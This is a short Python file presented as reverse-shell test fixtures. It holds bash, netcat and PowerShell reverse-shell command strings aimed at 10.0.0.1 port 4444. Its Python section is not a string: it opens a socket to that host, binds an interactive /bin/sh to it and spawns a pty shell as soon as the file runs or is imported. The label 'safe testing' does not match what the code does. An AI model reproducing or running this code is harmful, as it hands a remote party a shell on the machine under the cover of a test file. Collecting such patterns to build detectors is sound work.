# Reverse shell test fixtures
import socket, subprocess, os

# Bash TCP reverse shell (comment form for safe testing)
shell_cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# Netcat reverse shell
nc_cmd = "nc -e /bin/sh 10.0.0.1 4444"

# Python socket reverse shell pattern
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
subprocess.call(
    ["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno()
)

# pty spawn
import pty

pty.spawn("/bin/sh")

# PowerShell pattern
ps_cmd = "New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)"
